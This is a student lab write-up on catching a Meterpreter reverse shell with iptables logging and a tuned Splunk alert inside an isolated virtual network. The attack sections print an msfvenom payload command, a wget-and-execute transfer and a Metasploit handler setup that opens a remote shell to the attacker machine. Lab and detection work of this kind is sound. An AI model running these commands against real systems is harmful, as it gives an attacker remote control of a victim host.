# 📝 Reverse Shell Network Detection — Project Write-up

**Project:** Reverse Shell Network Detection & SIEM Alert Engineering

**Course:** MSci Cyber Security — Year 1, Lab Project

**Tools:** VirtualBox · Kali Linux · Ubuntu Server · Metasploit · Splunk Enterprise

📖 Read alongside: [🛡️ Fundamentals] for theory

> **AI Disclosure:** The structure, layout and formatting of this write-up were designed with the assistance of AI. All technical work, practical work, analysis and written content are my own.

---

## 🗺️ Lab Environment

### Network Architecture

The lab runs entirely on a single Windows host using VirtualBox. A host-only network (192.168.102.x) isolates all attack traffic within the machine — no traffic reaches the real home network at any point.

| Machine | Role | IP Address |
|---|---|---|
| Windows Host | Runs Splunk Enterprise · gateway for host-only network | 192.168.102.1 |
| Kali Linux VM | Attacker · runs Metasploit listener · receives reverse shell | 192.168.102.4 |
| Ubuntu Server VM | Target · Splunk Forwarder installed · executes payload | 192.168.102.3 |

```
Kali Linux (192.168.102.4)
└── msfvenom generates reverse shell payload
└──▶ payload transferred to Ubuntu target

Ubuntu Server (192.168.102.3)
└── Payload executed — initiates outbound TCP connection
└──▶ connects to Kali on port 4444

Kali Linux (192.168.102.4)
└── Metasploit handler catches shell
└──▶ full interactive Meterpreter session established

Ubuntu Server (192.168.102.3)
└── iptables LOG rule captures every outbound packet
└──▶ writes to /var/log/syslog
└──▶ Splunk Forwarder ships logs to Windows:9997

Windows Host (192.168.102.1)
└── Splunk indexes logs → SPL query identifies long-lived outbound connections
└──▶ Alert fires on sustained single-destination outbound TCP sessions
```

> The host-only network is critical for ethical containment. No reverse shell traffic leaves the laptop. Running Metasploit on a bridged or NAT network could direct attack traffic onto your real home network — potentially illegal under the Computer Misuse Act 1990 without explicit written permission.

**Figure 1 — Ubuntu Target IP Address**

*Screenshot: `ip a` output on Ubuntu confirming 192.168.102.3 on enp0s3 on the host-only network*

**Figure 2 — Kali Linux IP Address**

*Screenshot: `ip a` output on Kali confirming 192.168.102.4 on eth0 on the host-only network*

---

## 🔧 iptables Network Telemetry

### Why iptables for Reverse Shell Detection

Reverse shells are challenging to detect with application-level logs. The payload executes on the victim machine and initiates an outbound TCP connection — it looks like legitimate outbound traffic from the victim's perspective. Traditional auth logs (`/var/log/auth.log`) capture authentication events but are blind to post-exploitation network activity.

The solution is to capture network-layer events using iptables on both the INPUT and OUTPUT chains — enabling visibility into the full bidirectional flow of the reverse shell session.

### Configuring the LOG Rule

iptables rules were added to capture both inbound and outbound traffic:

```bash
sudo iptables -I INPUT -j LOG --log-prefix "IPTABLES_IN: " --log-level 4
sudo iptables -I OUTPUT -j LOG --log-prefix "IPTABLES_OUT: " --log-level 4
```

| Flag | Value | Purpose |
|---|---|---|
| `-I INPUT` / `-I OUTPUT` | — | Insert at the top of both chains |
| `-j LOG` | — | Write a log entry for every packet |
| `--log-prefix` | `"IPTABLES_IN: "` / `"IPTABLES_OUT: "` | Tags entries for direction-aware filtering in Splunk |
| `--log-level 4` | Warning level | Keeps volume manageable |

### Making the Rule Persistent

```bash
sudo mkdir -p /etc/iptables && sudo iptables-save | sudo tee /etc/iptables/rules.v4
sudo crontab -e
# Added:
@reboot iptables-restore < /etc/iptables/rules.v4
```

**Figure 3 — iptables LOG Rules Active**

*Screenshot: `sudo iptables -L -n -v` confirming LOG rules at top of both INPUT and OUTPUT chains*

**Figure 4 — Outbound Events in syslog**

*Screenshot: `tail -f /var/log/syslog | grep "IPTABLES_OUT"` showing live outbound entries after payload execution*

---

## ⚙️ Payload Generation & Delivery

### Generating the Reverse Shell Payload

A stageless Meterpreter payload was generated using msfvenom on Kali:

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.102.4 LPORT=4444 -f elf -o shell.elf
```

| Flag | Value | Purpose |
|---|---|---|
| `-p linux/x86/meterpreter_reverse_tcp` | — | Stageless Meterpreter for Linux x86 |
| `LHOST=192.168.102.4` | Kali IP | The address the shell will call home to |
| `LPORT=4444` | — | Port the Metasploit handler listens on |
| `-f elf` | — | Linux ELF binary format |
| `-o shell.elf` | — | Output filename |

### Transferring the Payload

The payload was transferred from Kali to Ubuntu using Python's built-in HTTP server — a technique that mirrors real-world delivery methods and requires no additional tools.

```bash
# On Kali — serve the file
python3 -m http.server 8080

# On Ubuntu — download the payload
wget http://192.168.102.4:8080/shell.elf
chmod +x shell.elf
```

**Figure 5 — msfvenom Payload Generation**

*Screenshot: msfvenom output showing payload size, encoder used, and successful `shell.elf` creation*

**Figure 6 — Payload Transfer via HTTP**

*Screenshot: wget output on Ubuntu confirming successful download of shell.elf from Kali*

---

## 📡 Splunk Forwarder Configuration

The Splunk Universal Forwarder was already installed on Ubuntu from the previous lab. Its configuration was extended to monitor `/var/log/syslog`.

### inputs.conf — Extended

```ini
[monitor:///var/log/auth.log]
index = main
sourcetype = linux_secure

[monitor:///var/log/syslog]
index = main
sourcetype = syslog
```

### Permissions Fix

```bash
sudo usermod -aG adm splunkfwd
sudo /opt/splunkforwarder/bin/splunk restart
```

### outputs.conf

```ini
[tcpout]
defaultGroup = default-autolb-group

[tcpout:default-autolb-group]
server = 192.168.102.1:9997
```

**Figure 7 — Splunk Receiving IPTABLES_OUT Events**

*Screenshot: Splunk Search showing IPTABLES_OUT events with DST=192.168.102.4, DPT=4444, PROTO=TCP*

---

## ⚔️ Attack Simulation

### Setting Up the Metasploit Handler

Before executing the payload, the Metasploit multi/handler was configured on Kali to listen for the incoming reverse connection:

```bash
msfconsole -q
use exploit/multi/handler
set payload linux/x86/meterpreter_reverse_tcp
set LHOST 192.168.102.4
set LPORT 4444
exploit
```

### Executing the Payload

```bash
# On Ubuntu target
./shell.elf
```

The moment the payload executes, Ubuntu initiates a TCP SYN to Kali on port 4444. The Metasploit handler responds with SYN-ACK, the handshake completes, and a full Meterpreter session is established. The connection remains persistent — this long-lived session is the key detection indicator.

**Figure 8 — Meterpreter Session Established (Kali)**

*Screenshot: Metasploit console showing `Meterpreter session 1 opened (192.168.102.4:4444 → 192.168.102.3:XXXXX)`*

**Figure 9 — iptables Log During Active Shell**

*Screenshot: Ubuntu syslog showing sustained IPTABLES_OUT entries with DST=192.168.102.4, DPT=4444, consistent SRC port*

---

## 🔍 Field Discovery in Splunk

Key fields identified from the iptables log format:

| Field | Example value | Role in detection query |
|---|---|---|
| SRC | 192.168.102.3 | Victim machine (source of reverse shell) |
| DST | 192.168.102.4 | C2 server (Kali — destination) |
| SPT | 54321 | Source port (victim ephemeral port — consistent per session) |
| DPT | 4444 | Destination port (C2 listener port) |
| PROTO | TCP | Protocol filter |
| IN / OUT | enp0s3 | Direction identification via log prefix |

**Figure 10 — Splunk Field Extraction Panel**

*Screenshot: Splunk interesting fields panel showing SRC, DST, DPT (4444), SPT values extracted from IPTABLES_OUT syslog events*

---

## 📊 Detection Query Development

### Detection Approach

A reverse shell is characterised by a single outbound TCP connection that persists for an unusually long time, with a consistent destination IP and port. Unlike port scanning (many ports, short duration), a reverse shell produces high event volume on a single destination port.

The detection logic counts repeated events from the same source-destination-port combination. Legitimate outbound connections are short-lived; a Meterpreter session generates sustained traffic.

### Initial Query

```splunk
index=main sourcetype=syslog IPTABLES_OUT
| stats count as connection_events by SRC, DST, DPT
| where connection_events > 50
| sort - connection_events
```

Results before tuning:

| SRC | DST | DPT | connection_events | Verdict |
|---|---|---|---|---|
| 192.168.102.3 (Ubuntu) | 192.168.102.4 (Kali) | 4444 | 847 | 🔴 REVERSE SHELL — confirmed C2 |
| 192.168.102.3 | 192.168.102.1 | 9997 | 312 | 🟡 FALSE POSITIVE — Splunk forwarder |

847 connection events on a single destination port is unambiguous. The Splunk forwarder traffic to port 9997 is the only significant false positive.

**Figure 11 — Initial Detection Query Results**

*Screenshot: Splunk statistics table showing Ubuntu→Kali:4444 (847 events) and Ubuntu→Windows:9997 (312 events)*

---

## 🎯 Threshold Tuning & False Positive Reduction

### Threshold Selection

| Source | Events | Classification |
|---|---|---|
| Ubuntu → Windows:9997 (Splunk forwarder) | 312 | Known false positive |
| Threshold set at 500 | — | Clear margin above Splunk forwarder |
| Ubuntu → Kali:4444 (reverse shell) | 847 | 🔴 Real C2 session — detected with large margin |

### False Positive Exclusions

```splunk
index=main sourcetype=syslog IPTABLES_OUT
| stats count as connection_events by SRC, DST, DPT
| where connection_events > 500
AND NOT (DST="192.168.102.1" AND DPT="9997")
```

Final result: Only Ubuntu→Kali:4444 returned, with 847 events — zero false positives.

**Figure 12 — Tuned Query Results**

*Screenshot: Splunk statistics table showing single row — 192.168.102.3 → 192.168.102.4:4444 with 847 connection_events*

---

## 🔔 Alert Configuration

| Setting | Value | Rationale |
|---|---|---|
| Alert type | Scheduled | Runs on a fixed timer |
| Schedule | Every 5 minutes | Timely detection of active sessions |
| Time range | Last 15 minutes | Captures active sessions without accumulating stale data |
| Trigger condition | Number of results > 0 | Alert immediately on any sustained connection |
| Throttle | 60 minutes | Prevents repeat alerts for the same active session |
| Action | Log Event | Records alert in Splunk's own index for verification |

**Log Event message:**

`Reverse shell detected. Victim IP $result.SRC$ has an active outbound connection to $result.DST$ on port $result.DPT$ ($result.connection_events$ events).`

### MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| Tactic | Command and Control (TA0011) |
| Technique | T1059 — Command and Scripting Interpreter |
| Sub-technique | T1059.004 — Unix Shell |
| Additional | T1071.001 — Application Layer Protocol: Web Protocols |

**Figure 13 — Save As Alert Dialog**

*Screenshot: Splunk Save As Alert form showing title "Reverse Shell Detection", schedule every 5 minutes, trigger when results > 0*

**Figure 14 — Active Alerts List**

*Screenshot: Splunk Alerts page showing three enabled alerts — Port Scan Detection, SSH Brute Force Detected, and Reverse Shell Detection*

---

## ✅ Summary

| Finding | Detail |
|---|---|
| 🔴 Reverse shell confirmed | Ubuntu (192.168.102.3) established persistent outbound connection to Kali (192.168.102.4) on port 4444 |
| 🔴 847 events captured | High-volume single-destination traffic uniquely identifies active C2 session |
| 🟡 One false positive resolved | Splunk forwarder traffic to port 9997 excluded by destination filter |
| ✅ Pipeline verified end-to-end | iptables OUTPUT → syslog → Forwarder → Splunk Enterprise all functioning correctly |
| ✅ Detection query working | count > 500 on single SRC/DST/DPT correctly identified C2 with zero false positives |
| ✅ Alert configured | Scheduled every 5 minutes over 15-minute window, throttled at 60 minutes |
